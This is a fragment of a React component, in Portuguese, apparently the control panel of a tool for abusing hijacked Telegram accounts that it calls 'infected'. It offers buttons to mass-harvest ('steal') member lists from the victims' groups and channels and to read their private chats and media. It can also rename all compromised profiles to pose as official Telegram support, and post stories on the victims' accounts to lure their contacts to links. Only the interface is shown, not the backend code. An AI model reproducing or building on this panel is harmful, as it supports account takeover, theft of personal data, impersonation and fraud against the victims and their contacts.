                        {isHarvestingAll && <div style={{color:'#00ff00', fontWeight:'bold', background:'rgba(0,255,0,0.1)', padding:'8px 15px', borderRadius:'8px', border:'1px solid #238636'}}>ASPIRANDO: +{totalHarvestedSession} LEADS</div>}
                        
                        {!isHarvestingAll ? (
                             <button onClick={startMassHarvest} style={{padding:'14px 25px', background:'#238636', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold', fontSize:'15px', boxShadow:'0 4px 12px rgba(35, 134, 54, 0.2)'}}>🕷️ MODO ASPIRADOR (AUTO)</button>
                        ) : (
                             <button onClick={() => stopHarvestRef.current = true} style={{padding:'14px 25px', background:'#f85149', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold', fontSize:'15px'}}>🛑 INTERROMPER</button>
                        )}

                        <input type="text" placeholder="Filtrar por número infectado..." value={filterNumber} onChange={e => setFilterNumber(e.target.value)} style={{padding:'12px', borderRadius:'8px', background:'#0d1117', border:'1px solid #30363d', color:'white', width:'220px'}}/>
                        
                        <button onClick={scanNetwork} disabled={isScanning} style={{padding:'14px 25px', background:'#8957e5', color:'white', border:'none', borderRadius:'8px', cursor: isScanning ? 'not-allowed' : 'pointer', fontWeight:'bold', fontSize:'15px'}}>
                            {isScanning ? `SCANNING... ${scanProgress}%` : '🔄 SCANNER GERAL'}
                        </button>
                    </div>
                </div>

                <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'25px'}}>
                    {/* LISTA DE GRUPOS */}
                    <div style={{background:'#0d1117', padding:'20px', borderRadius:'12px', border:'1px solid #21262d'}}>
                        <h3 style={{color:'#d29922', borderBottom:'1px solid #21262d', paddingBottom:'15px', marginTop:0, display:'flex', justifyContent:'space-between'}}>
                            👥 GRUPOS DISPONÍVEIS <span>{filteredGroups.length}</span>
                        </h3>
                        <div style={{maxHeight:'650px', overflowY:'auto', paddingRight:'10px'}}>
                            {filteredGroups.map(g => {
                                const isDone = harvestedIds.has(g.id);
                                return (
                                <div key={g.id} style={{display:'flex', alignItems:'center', gap:'15px', padding:'15px', borderBottom:'1px solid #161b22', transition:'0.2s', background: isDone ? 'rgba(0,255,0,0.02)' : 'transparent'}}>
                                    <div style={{width:'50px', height:'50px', borderRadius:'50%', background:'#161b22', overflow:'hidden', border: isDone ? '2px solid #238636' : '2px solid #30363d'}}>
                                        {g.photo ? <img src={g.photo} style={{width:'100%', height:'100%', objectFit:'cover'}}/> : <div style={{textAlign:'center', lineHeight:'50px', fontSize:'20px'}}>👥</div>}
                                    </div>
                                    <div style={{flex:1, minWidth:0}}>
                                        <div style={{fontWeight:'bold', color: isDone ? '#58a6ff' : 'white', fontSize:'15px', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis'}}>{g.title} {isDone && '✅'}</div>
                                        <div style={{fontSize:'12px', color:'#8b949e', marginTop:'4px'}}>{g.participantsCount?.toLocaleString()} leads • Via: {g.ownerPhone}</div>
                                    </div>
                                    <div style={{display:'flex', gap:'8px'}}>
                                        <button onClick={()=>openChatViewer(g)} title="Ver mensagens e mídias" style={{padding:'8px', background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'6px', cursor:'pointer'}}>👁️</button>
                                        <button onClick={()=>stealLeadsManual(g)} style={{padding:'8px 12px', background: isDone ? '#238636' : '#d29922', border:'none', color:'white', borderRadius:'6px', cursor:'pointer', fontWeight:'bold', fontSize:'12px'}}>
                                            {isDone ? 'COLHIDO' : 'ROUBAR'}
                                        </button>
                                    </div>
                                </div>
                            )})}
                        </div>
                    </div>

                    {/* LISTA DE CANAIS */}
                    <div style={{background:'#0d1117', padding:'20px', borderRadius:'12px', border:'1px solid #21262d'}}>
                        <h3 style={{color:'#3390ec', borderBottom:'1px solid #21262d', paddingBottom:'15px', marginTop:0, display:'flex', justifyContent:'space-between'}}>
                            📢 CANAIS PARA CLONAR <span>{filteredChannels.length}</span>
                        </h3>
                        <div style={{maxHeight:'650px', overflowY:'auto', paddingRight:'10px'}}>
                            {filteredChannels.map(c => {
                                const isDone = harvestedIds.has(c.id);
                                return (
                                <div key={c.id} style={{display:'flex', alignItems:'center', gap:'15px', padding:'15px', borderBottom:'1px solid #161b22', background: isDone ? 'rgba(0,255,0,0.02)' : 'transparent'}}>
                                    <div style={{width:'50px', height:'50px', borderRadius:'50%', background:'#161b22', overflow:'hidden', border: isDone ? '2px solid #238636' : '2px solid #30363d'}}>
                                        {c.photo ? <img src={c.photo} style={{width:'100%', height:'100%', objectFit:'cover'}}/> : <div style={{textAlign:'center', lineHeight:'50px', fontSize:'20px'}}>📢</div>}
                                    </div>
                                    <div style={{flex:1, minWidth:0}}>
                                        <div style={{fontWeight:'bold', color: isDone ? '#58a6ff' : 'white', fontSize:'15px', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis'}}>{c.title} {isDone && '✅'}</div>
                                        <div style={{fontSize:'12px', color:'#8b949e', marginTop:'4px'}}>{c.participantsCount?.toLocaleString()} inscritos • Via: {c.ownerPhone}</div>
                                    </div>
                                    <div style={{display:'flex', gap:'8px'}}>
                                        <button onClick={()=>openChatViewer(c)} style={{padding:'8px', background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'6px', cursor:'pointer'}}>👁️</button>
                                        <button onClick={()=>stealLeadsManual(c)} style={{padding:'8px 12px', background: isDone ? '#238636' : '#1f6feb', border:'none', color:'white', borderRadius:'6px', cursor:'pointer', fontWeight:'bold', fontSize:'12px'}}>
                                            {isDone ? 'COLHIDO' : 'TENTAR'}
                                        </button>
                                    </div>
                                </div>
                            )})}
                        </div>
                    </div>
                </div>
            </div>
        )}

        {/* --- ABA FERRAMENTAS (CAMUFLAGEM E STORIES) --- */}
        {tab === 'tools' && (
             <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'25px' }}>
                
                {/* CLONAGEM DE IDENTIDADE */}
                <div style={{ backgroundColor: '#161b22', padding: '30px', borderRadius:'12px', border:'1px solid #30363d' }}>
                    <h3 style={{marginTop:0, color:'#8957e5'}}>🎭 Camuflagem em Massa</h3>
                    <p style={{fontSize:'13px', opacity:0.7, marginBottom:'25px'}}>Altere o Nome e Foto de todos os infectados selecionados para parecerem suporte oficial ou perfis atraentes.</p>
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Novo Nome Exibido:</label>
                    <input type="text" placeholder="Ex: Suporte VIP Telegram" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '20px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>URL da Foto de Perfil:</label>
                    <input type="text" placeholder="https://..." value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '25px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
                    
                    <button onClick={handleMassUpdateProfile} disabled={processing} style={{ width: '100%', padding: '18px', background: '#8957e5', color: 'white', border: 'none', borderRadius:'10px', fontWeight:'bold', cursor:'pointer', fontSize:'16px' }}>
                        ATUALIZAR IDENTIDADES SELECIONADAS
                    </button>
                </div>

                {/* POSTAGEM DE STORIES */}
                <div style={{ backgroundColor: '#161b22', padding: '30px', borderRadius:'12px', border:'1px solid #30363d' }}>
                    <h3 style={{marginTop:0, color:'#3390ec'}}>📸 Postagem de Stories Global</h3>
                    <p style={{fontSize:'13px', opacity:0.7, marginBottom:'25px'}}>Poste uma imagem ou vídeo nos Stories de todos os infectados para gerar tráfego passivo nos contatos deles.</p>
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Mídia URL (MP4 ou JPG):</label>
                    <input type="text" placeholder="https://..." value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', marginBottom: '20px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px'}}>Legenda do Story:</label>
                    <input type="text" placeholder="Clique no link da Bio! 🔥" value={storyCaption} onChange={e => setStoryCaption(e.target.value)} style={{ width: '100%', marginBottom: '25px', padding: '14px', background: '#0d1117', border: '1px solid #30363d', color: 'white', borderRadius:'8px' }} />
                    
                    <button onClick={handleMassPostStory} disabled={processing} style={{ width: '100%', padding: '18px', background: '#1f6feb', color: 'white', border: 'none', borderRadius:'10px', fontWeight:'bold', cursor:'pointer', fontSize:'16px' }}>
                        PUBLICAR NOS STORIES SELECIONADOS
                    </button>
                </div>

            </div>
        )}
    </div>
  );
}
